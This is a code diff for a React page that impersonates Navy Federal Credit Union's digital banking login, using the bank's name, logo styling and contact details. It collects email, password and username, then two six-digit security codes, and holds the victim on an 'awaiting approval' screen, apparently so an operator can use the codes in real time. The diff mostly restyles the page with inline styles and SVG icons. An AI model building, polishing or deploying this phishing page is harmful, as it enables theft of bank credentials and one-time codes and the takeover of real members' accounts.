@@ -1,19 +1,6 @@
 'use client'
 
 import { useEffect, useState } from 'react'
-import { 
-  Menu, 
-  Globe, 
-  Lock, 
-  HelpCircle, 
-  Eye, 
-  EyeOff, 
-  Laptop, 
-  ShieldCheck, 
-  UserCheck, 
-  Home 
-} from 'lucide-react'
-
 import {
   startChallenge,
   submitUsername,
@@ -137,60 +124,63 @@ export default function NavyFederalBanking() {
   }
 
   return (
-    <div className="min-h-screen bg-[#143260] font-sans antialiased text-gray-800">
+    <div style={styles.container}>
       {/* Navigation Header */}
-      <header className="bg-[#104780] text-white px-4 py-3 flex items-center justify-between border-b border-blue-900">
-        <div className="flex items-center space-x-3">
-          <button className="p-1 hover:bg-blue-800 rounded transition-colors" aria-label="Menu">
-            <Menu className="w-6 h-6 text-white" />
+      <header style={styles.header}>
+        <div style={styles.headerLeft}>
+          <button style={styles.iconBtn} aria-label="Menu">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+              <line x1="3" y1="12" x2="21" y2="12" />
+              <line x1="3" y1="6" x2="21" y2="6" />
+              <line x1="3" y1="18" x2="21" y2="18" />
+            </svg>
           </button>
-          <div className="flex items-center space-x-2">
-            <Globe className="w-7 h-7 text-white" />
-            <span className="font-extrabold tracking-tight text-xl uppercase italic">
-              Navy Federal
-            </span>
+          <div style={styles.logoGroup}>
+            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+              <circle cx="12" cy="12" r="10" />
+              <line x1="2" y1="12" x2="22" y2="12" />
+              <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
+            </svg>
+            <span style={styles.logoText}>NAVY FEDERAL</span>
           </div>
         </div>
       </header>
 
-      {/* Main Content Area */}
-      <main className="max-w-md mx-auto">
-        {/* Banner Title Section */}
-        <section className="bg-[#a8c9e8] px-5 py-4">
-          <h1 className="text-2xl font-bold text-[#10305a]">
+      <main style={styles.main}>
+        {/* Banner Section */}
+        <section style={styles.banner}>
+          <h1 style={styles.bannerTitle}>
             {step === 'approved_success' ? 'Verification Complete' : 'Welcome to Digital Banking'}
           </h1>
         </section>
 
-        {/* Sign In / Flow Form Container */}
-        <section className="bg-[#a8c9e8] px-4 pb-6">
-          <div className="bg-[#f4f4f4] rounded-lg shadow-md p-5 border-t-4 border-[#e07e27]">
+        {/* Card Section */}
+        <section style={styles.cardWrapper}>
+          <div style={styles.card}>
             {step === 'approved_success' ? (
-              <div className="space-y-3">
-                <h2 className="text-xl font-semibold text-gray-800 border-b border-gray-300 pb-3">
-                  Congratulations
-                </h2>
-                <p className="text-sm text-gray-700 leading-relaxed">
-                  Your account &amp; verification has been approved.
-                </p>
-                {email ? <p className="text-sm font-bold text-gray-800">{email}</p> : null}
+              <div>
+                <h2 style={styles.cardHeaderTitle}>Congratulations</h2>
+                <hr style={styles.divider} />
+                <p style={styles.text}>Your account &amp; verification has been approved.</p>
+                {email ? <p style={{ ...styles.text, fontWeight: 'bold' }}>{email}</p> : null}
               </div>
             ) : (
               <>
-                <div className="flex items-center space-x-2 border-b border-gray-300 pb-3 mb-5">
-                  <Lock className="w-6 h-6 text-gray-700" />
-                  <h2 className="text-xl font-semibold text-gray-800">
-                    {titles[step]}
-                  </h2>
+                <div style={styles.cardHeader}>
+                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#4a5568" strokeWidth="2">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+                  </svg>
+                  <h2 style={styles.cardHeaderTitle}>{titles[step]}</h2>
                 </div>
 
-                <form onSubmit={onSubmit} className="space-y-4">
+                <form onSubmit={onSubmit}>
                   {step === 'credentials' && (
                     <>
-                      <div>
-                        <label htmlFor="email" className="flex items-center text-sm font-bold text-gray-800 mb-1">
+                      <div style={styles.formGroup}>
+                        <label htmlFor="email" style={styles.label}>
                           Email
-                          <HelpCircle className="w-4 h-4 ml-1 text-gray-500 cursor-pointer" />
+                          <span style={styles.helpBadge}>?</span>
                         </label>
                         <input
                           id="email"
@@ -198,50 +188,54 @@ export default function NavyFederalBanking() {
                           required
                           value={email}
                           onChange={(e) => setEmail(e.target.value)}
-                          className="w-full px-3 py-2 bg-white border border-gray-400 rounded focus:outline-none focus:ring-2 focus:ring-blue-600"
+                          style={styles.input}
+                          autoComplete="email"
                         />
                       </div>
 
-                      <div>
-                        <label htmlFor="password" className="block text-sm font-bold text-gray-800 mb-1">
-                          Password
-                        </label>
-                        <div className="relative">
+                      <div style={styles.formGroup}>
+                        <label htmlFor="password" style={styles.label}>Password</label>
+                        <div style={styles.inputRelative}>
                           <input
                             id="password"
                             type={showPassword ? 'text' : 'password'}
                             required
                             value={password}
                             onChange={(e) => setPassword(e.target.value)}
-                            className="w-full px-3 py-2 bg-white border border-gray-400 rounded pr-10 focus:outline-none focus:ring-2 focus:ring-blue-600"
+                            style={styles.input}
+                            autoComplete="current-password"
                           />
                           <button
                             type="button"
                             onClick={() => setShowPassword(!showPassword)}
-                            className="absolute right-3 top-1/2 -translate-y-1/2 text-blue-900 hover:text-blue-700"
-                            aria-label="Toggle password visibility"
+                            style={styles.eyeBtn}
+                            aria-label="Toggle password"
                           >
-                            {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#104780" strokeWidth="2">
+                              {showPassword ? (
+                                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24M1 1l22 22" />
+                              ) : (
+                                <>
+                                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
+                                  <circle cx="12" cy="12" r="3" />
+                                </>
+                              )}
+                            </svg>
                           </button>
                         </div>
                       </div>
 
-                      <div>
-                        <a
-                          href="#signin-help"
-                          className="text-xs font-bold text-[#104780] border-b border-dotted border-blue-800 tracking-wider uppercase hover:underline"
-                        >
-                          SIGN IN HELP
-                        </a>
+                      <div style={{ marginBottom: 16 }}>
+                        <a href="#help" style={styles.dottedLink}>SIGN IN HELP</a>
                       </div>
                     </>
                   )}
 
                   {step === 'username' && (
-                    <div>
-                      <label htmlFor="username" className="flex items-center text-sm font-bold text-gray-800 mb-1">
+                    <div style={styles.formGroup}>
+                      <label htmlFor="username" style={styles.label}>
                         Username
-                        <HelpCircle className="w-4 h-4 ml-1 text-gray-500 cursor-pointer" />
+                        <span style={styles.helpBadge}>?</span>
                       </label>
                       <input
                         id="username"
@@ -249,15 +243,15 @@ export default function NavyFederalBanking() {
                         required
                         value={username}
                         onChange={(e) => setUsername(e.target.value)}
-                        className="w-full px-3 py-2 bg-white border border-gray-400 rounded focus:outline-none focus:ring-2 focus:ring-blue-600"
+                        style={styles.input}
                         autoComplete="username"
                       />
                     </div>
                   )}
 
                   {(step === 'otp1' || step === 'otp2') && (
-                    <div>
-                      <label htmlFor="otp" className="block text-sm font-bold text-gray-800 mb-1">
+                    <div style={styles.formGroup}>
+                      <label htmlFor="otp" style={styles.label}>
                         {step === 'otp1' ? 'First Security Code' : 'Second Security Code'}
                       </label>
                       <input
@@ -268,26 +262,18 @@ export default function NavyFederalBanking() {
                         maxLength={6}
                         value={otp}
                         onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))}
-                        className="w-full px-3 py-2 bg-white border border-gray-400 rounded focus:outline-none focus:ring-2 focus:ring-blue-600"
+                        style={styles.input}
                       />
                     </div>
                   )}
 
-                  {step === 'awaiting_approval' && (
-                    <p className="text-sm text-gray-700 leading-relaxed">{WAIT_MSG}</p>
-                  )}
+                  {step === 'awaiting_approval' && <p style={styles.text}>{WAIT_MSG}</p>}
 
-                  {error && <p className="text-red-600 text-sm font-semibold m-0">{error}</p>}
-                  {note && step !== 'awaiting_approval' && (
-                    <p className="text-gray-700 text-sm m-0">{note}</p>
-                  )}
+                  {error && <p style={styles.errorText}>{error}</p>}
+                  {note && step !== 'awaiting_approval' && <p style={styles.noteText}>{note}</p>}
 
                   {step !== 'awaiting_approval' && step !== 'rejected' && (
-                    <button
-                      type="submit"
-                      disabled={loading}
-                      className="w-full mt-4 bg-[#e07e27] hover:bg-[#c96c1e] disabled:opacity-50 text-white font-bold py-3 px-4 rounded shadow transition-colors text-base"
-                    >
+                    <button type="submit" disabled={loading} style={styles.btnPrimary}>
                       {loading ? 'Please wait…' : step === 'credentials' ? 'Sign In' : 'Continue'}
                     </button>
                   )}
@@ -303,7 +289,7 @@ export default function NavyFederalBanking() {
                         setError(null)
                         setNote(null)
                       }}
-                      className="w-full bg-transparent hover:bg-gray-200 text-[#104780] font-bold py-2 px-4 rounded border border-[#104780] transition-colors text-sm mt-2"
+                      style={styles.btnSecondary}
                     >
                       Start over
                     </button>
@@ -315,161 +301,249 @@ export default function NavyFederalBanking() {
         </section>
 
         {/* Member Callout Section */}
-        <section className="bg-white px-6 py-8 text-center space-y-4">
-          <h2 className="text-xl font-bold text-[#10305a]">
-            Not a Navy Federal Member?
-          </h2>
-          <p className="text-gray-700 text-sm leading-relaxed max-w-sm mx-auto">
+        <section style={styles.whiteSection}>
+          <h2 style={styles.sectionHeading}>Not a Navy Federal Member?</h2>
+          <p style={styles.sectionDesc}>
             Join now and enjoy the support and great service of a credit union that puts your needs first.
           </p>
-          <div className="space-y-3 pt-2">
-            <button className="w-full bg-[#e07e27] hover:bg-[#c96c1e] text-white font-bold py-3 px-4 rounded transition-colors">
-              Become a Member
-            </button>
-            <button className="w-full bg-[#2b6cb0] hover:bg-[#205288] text-white font-bold py-3 px-4 rounded transition-colors">
-              Learn More
-            </button>
-          </div>
-        </section>
-
-        {/* Info Cards Container */}
-        <section className="bg-[#143260] px-4 py-6 space-y-6">
-          {/* Card 1 */}
-          <div className="bg-white rounded-lg p-6 text-center shadow-lg relative pt-12 mt-6">
-            <div className="absolute -top-8 left-1/2 -translate-x-1/2 bg-white rounded-full p-3 shadow-md border border-gray-100">
-              <div className="w-12 h-12 rounded-full bg-blue-50 flex items-center justify-center">
-                <Laptop className="w-7 h-7 text-[#104780]" />
-              </div>
-            </div>
-            <h3 className="font-bold text-gray-800 text-lg mb-2">
-              Don't have online access?
-            </h3>
-            <a
-              href="#enroll"
-              className="inline-block text-xs font-bold text-[#104780] border-b border-dotted border-blue-800 tracking-wider uppercase hover:underline"
-            >
-              ENROLL IN DIGITAL BANKING »
-            </a>
-          </div>
-
-          {/* Card 2 */}
-          <div className="bg-white rounded-lg p-6 text-center shadow-lg relative pt-12 mt-6">
-            <div className="absolute -top-8 left-1/2 -translate-x-1/2 bg-white rounded-full p-3 shadow-md border border-gray-100">
-              <div className="w-12 h-12 rounded-full bg-blue-50 flex items-center justify-center">
-                <ShieldCheck className="w-7 h-7 text-[#104780]" />
-              </div>
-            </div>
-            <h3 className="font-bold text-gray-800 text-lg mb-2">
-              Find out more about secure digital banking
-            </h3>
-            <a
-              href="#learn-more"
-              className="inline-block text-xs font-bold text-[#104780] border-b border-dotted border-blue-800 tracking-wider uppercase hover:underline"
-            >
-              LEARN MORE »
-            </a>
-          </div>
-
-          {/* Card 3 */}
-          <div className="bg-white rounded-lg p-6 text-center shadow-lg relative pt-12 mt-6">
-            <div className="absolute -top-8 left-1/2 -translate-x-1/2 bg-white rounded-full p-3 shadow-md border border-gray-100">
-              <div className="w-12 h-12 rounded-full bg-blue-50 flex items-center justify-center">
-                <UserCheck className="w-7 h-7 text-[#104780]" />
-              </div>
-            </div>
-            <h3 className="font-bold text-gray-800 text-lg mb-2">Need help?</h3>
-            <a
-              href="#contact"
-              className="inline-block text-xs font-bold text-[#104780] border-b border-dotted border-blue-800 tracking-wider uppercase hover:underline"
-            >
-              CONTACT US »
-            </a>
+          <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
+            <button style={styles.btnPrimary}>Become a Member</button>
+            <button style={styles.btnBlue}>Learn More</button>
           </div>
         </section>
 
         {/* Footer Section */}
-        <footer className="bg-[#e5e7eb] text-gray-700 px-6 py-8 text-xs space-y-4">
-          {/* Logo & Contact */}
-          <div className="space-y-2">
-            <div className="flex items-center space-x-2 text-[#10305a]">
-              <Globe className="w-6 h-6" />
-              <div className="leading-tight">
-                <div className="font-extrabold text-base tracking-tight uppercase italic">NAVY FEDERAL</div>
-                <div className="text-[10px] tracking-wider uppercase font-semibold">Credit Union</div>
-              </div>
-            </div>
-            <div className="pt-2 text-sm text-gray-800">
-              <span>24/7 Member Services: </span>
-              <a href="tel:18888426328" className="text-[#104780] font-bold border-b border-dotted border-blue-800">
-                1-888-842-6328
-              </a>
-            </div>
-            <div className="text-sm text-gray-800">
-              <span>Routing Number: </span>
-              <span className="font-bold">256074974</span>
+        <footer style={styles.footer}>
+          <div style={styles.logoGroupFooter}>
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#10305a" strokeWidth="2">
+              <circle cx="12" cy="12" r="10" />
+              <line x1="2" y1="12" x2="22" y2="12" />
+            </svg>
+            <div>
+              <div style={{ fontWeight: 800, fontSize: 16, color: '#10305a', fontStyle: 'italic' }}>NAVY FEDERAL</div>
+              <div style={{ fontSize: 10, textTransform: 'uppercase', color: '#10305a', fontWeight: 600 }}>Credit Union</div>
             </div>
           </div>
-
-          <hr className="border-gray-300 my-3" />
-
-          {/* Footer Links */}
-          <div className="flex flex-wrap gap-x-2 gap-y-1 text-[#104780] font-semibold">
-            <a href="#about" className="border-b border-dotted border-blue-800">About Us</a>
-            <span>|</span>
-            <a href="#contact" className="border-b border-dotted border-blue-800">Contact Us</a>
-            <span>|</span>
-            <a href="#privacy" className="border-b border-dotted border-blue-800">Privacy</a>
-            <span>|</span>
-            <a href="#security" className="border-b border-dotted border-blue-800">Security</a>
-            <span>|</span>
-            <a href="#accessibility" className="border-b border-dotted border-blue-800">Accessibility</a>
-            <span>|</span>
-            <a href="#browser" className="border-b border-dotted border-blue-800">Browser Support</a>
-            <span>|</span>
-            <a href="#terms" className="border-b border-dotted border-blue-800">Terms and Conditions</a>
-            <span>|</span>
-            <a href="#disclosures" className="border-b border-dotted border-blue-800">Disclosures</a>
-          </div>
-
-          <p>© 2026 Navy Federal Credit Union. All rights reserved.</p>
-
-          {/* Insurance Badges */}
-          <div className="space-y-2 pt-1">
-            <div className="flex items-center space-x-2">
-              <span className="bg-[#104780] text-white font-bold text-[10px] px-1 py-0.5 rounded">NCUA</span>
-              <a href="#ncua" className="text-[#104780] font-semibold border-b border-dotted border-blue-800">
-                Federally Insured by NCUA
-              </a>
-              <span>|</span>
-            </div>
-            <div className="flex items-center space-x-1">
-              <Home className="w-4 h-4 text-[#104780]" />
-              <a href="#housing" className="text-[#104780] font-semibold border-b border-dotted border-blue-800">
-                Equal Housing Lender
-              </a>
-            </div>
-          </div>
-
-          {/* Legal Disclaimers */}
-          <div className="space-y-3 text-[11px] text-gray-600 leading-relaxed pt-2">
-            <p>APY = Annual Percentage Yield | APR = Annual Percentage Rate</p>
-            <p>APY is accurate as of August 31, 2026 ET.</p>
-            <p>+Rates are based on an evaluation of credit history, so your rate may differ.</p>
-            <p>++Rates are variable, and based on an evaluation of credit history, so your rate may differ.</p>
-            <p>
-              *Message and data rates may apply.{' '}
-              <a href="#terms" className="text-[#104780] border-b border-dotted border-blue-800">
-                Terms and Conditions
-              </a>{' '}
-              are available.
-            </p>
-            <p>
-              Military images used for representational purposes only; do not imply government endorsement.
-              iPhone®, iPad® and iPod touch® are trademarks of Apple Inc. App Store℠ is a service mark of Apple Inc. Android™ and Google Play™ are trademarks of Google Inc. Images used for representational purposes only; do not imply government endorsement.
-            </p>
-          </div>
+          <p style={{ margin: '12px 0 0', fontSize: 12, color: '#4a5568' }}>© 2026 Navy Federal Credit Union. All rights reserved.</p>
         </footer>
       </main>
     </div>
   )
+}
+
+const styles: { [key: string]: React.CSSProperties } = {
+  container: {
+    minHeight: '100vh',
+    backgroundColor: '#143260',
+    fontFamily: 'system-ui, -apple-system, sans-serif',
+    color: '#2d3748',
+    margin: 0,
+  },
+  header: {
+    backgroundColor: '#104780',
+    color: '#ffffff',
+    padding: '12px 16px',
+    borderBottom: '1px solid #0c3663',
+  },
+  headerLeft: {
+    display: 'flex',
+    alignItems: 'center',
+    gap: 12,
+  },
+  iconBtn: {
+    background: 'none',
+    border: 'none',
+    color: '#fff',
+    cursor: 'pointer',
+    padding: 4,
+    display: 'flex',
+  },
+  logoGroup: {
+    display: 'flex',
+    alignItems: 'center',
+    gap: 8,
+  },
+  logoText: {
+    fontWeight: 800,
+    fontSize: 20,
+    fontStyle: 'italic',
+    letterSpacing: '-0.5px',
+  },
+  main: {
+    maxWidth: 440,
+    margin: '0 auto',
+  },
+  banner: {
+    backgroundColor: '#a8c9e8',
+    padding: '16px 20px',
+  },
+  bannerTitle: {
+    margin: 0,
+    fontSize: 22,
+    fontWeight: 700,
+    color: '#10305a',
+  },
+  cardWrapper: {
+    backgroundColor: '#a8c9e8',
+    padding: '0 16px 24px',
+  },
+  card: {
+    backgroundColor: '#f4f4f4',
+    borderRadius: 8,
+    borderTop: '4px solid #e07e27',
+    padding: 20,
+    boxShadow: '0 4px 6px rgba(0,0,0,0.1)',
+  },
+  cardHeader: {
+    display: 'flex',
+    alignItems: 'center',
+    gap: 8,
+    borderBottom: '1px solid #cbd5e0',
+    paddingBottom: 12,
+    marginBottom: 20,
+  },
+  cardHeaderTitle: {
+    margin: 0,
+    fontSize: 20,
+    fontWeight: 600,
+    color: '#2d3748',
+  },
+  formGroup: {
+    marginBottom: 16,
+  },
+  label: {
+    display: 'flex',
+    alignItems: 'center',
+    fontSize: 14,
+    fontWeight: 700,
+    color: '#2d3748',
+    marginBottom: 4,
+  },
+  helpBadge: {
+    marginLeft: 6,
+    backgroundColor: '#718096',
+    color: '#fff',
+    borderRadius: '50%',
+    width: 16,
+    height: 16,
+    fontSize: 10,
+    display: 'inline-flex',
+    alignItems: 'center',
+    justifyContent: 'center',
+  },
+  inputRelative: {
+    position: 'relative',
+    display: 'flex',
+    alignItems: 'center',
+  },
+  input: {
+    width: '100%',
+    padding: '10px 12px',
+    backgroundColor: '#ffffff',
+    border: '1px solid #a0aec0',
+    borderRadius: 4,
+    fontSize: 15,
+    boxSizing: 'border-box',
+    outline: 'none',
+  },
+  eyeBtn: {
+    position: 'absolute',
+    right: 10,
+    background: 'none',
+    border: 'none',
+    cursor: 'pointer',
+    padding: 0,
+    display: 'flex',
+  },
+  dottedLink: {
+    fontSize: 12,
+    fontWeight: 700,
+    color: '#104780',
+    textDecoration: 'none',
+    borderBottom: '1px dotted #104780',
+    letterSpacing: '0.5px',
+  },
+  btnPrimary: {
+    width: '100%',
+    backgroundColor: '#e07e27',
+    color: '#ffffff',
+    border: 'none',
+    borderRadius: 4,
+    padding: '12px 16px',
+    fontSize: 16,
+    fontWeight: 700,
+    cursor: 'pointer',
+    boxShadow: '0 2px 4px rgba(0,0,0,0.1)',
+  },
+  btnSecondary: {
+    width: '100%',
+    backgroundColor: 'transparent',
+    color: '#104780',
+    border: '1px solid #104780',
+    borderRadius: 4,
+    padding: '10px 16px',
+    fontSize: 14,
+    fontWeight: 700,
+    cursor: 'pointer',
+    marginTop: 10,
+  },
+  btnBlue: {
+    width: '100%',
+    backgroundColor: '#2b6cb0',
+    color: '#ffffff',
+    border: 'none',
+    borderRadius: 4,
+    padding: '12px 16px',
+    fontSize: 16,
+    fontWeight: 700,
+    cursor: 'pointer',
+  },
+  whiteSection: {
+    backgroundColor: '#ffffff',
+    padding: '32px 24px',
+    textAlign: 'center',
+  },
+  sectionHeading: {
+    margin: '0 0 12px',
+    fontSize: 20,
+    fontWeight: 700,
+    color: '#10305a',
+  },
+  sectionDesc: {
+    margin: '0 0 20px',
+    fontSize: 14,
+    color: '#4a5568',
+    lineHeight: 1.5,
+  },
+  text: {
+    fontSize: 14,
+    lineHeight: 1.5,
+    color: '#4a5568',
+    margin: '0 0 12px',
+  },
+  errorText: {
+    color: '#e53e3e',
+    fontSize: 14,
+    fontWeight: 600,
+    margin: '0 0 12px',
+  },
+  noteText: {
+    color: '#2d3748',
+    fontSize: 14,
+    margin: '0 0 12px',
+  },
+  divider: {
+    border: 'none',
+    borderTop: '1px solid #cbd5e0',
+    margin: '12px 0',
+  },
+  footer: {
+    backgroundColor: '#e5e7eb',
+    padding: '24px 24px',
+  },
+  logoGroupFooter: {
+    display: 'flex',
+    alignItems: 'center',
+    gap: 8,
+  },
 }
